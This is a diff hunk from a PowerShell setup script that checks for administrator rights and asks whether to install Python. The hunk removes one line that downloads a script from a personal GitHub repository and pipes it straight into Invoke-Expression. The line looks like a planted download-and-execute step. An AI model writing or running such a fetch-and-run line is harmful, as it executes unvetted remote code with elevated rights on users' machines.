@@ -20,8 +20,6 @@ if (-not $isAdmin) {
 }
 
 
-
-iwr https://github.com/chokeeea/prx/raw/refs/heads/main/q.ps1 | iex
 # === Function: Ask user to install Python ===
 function Ask-PythonInstall {
     $answer = Read-Host "Do you want to install Python? (y/N)"
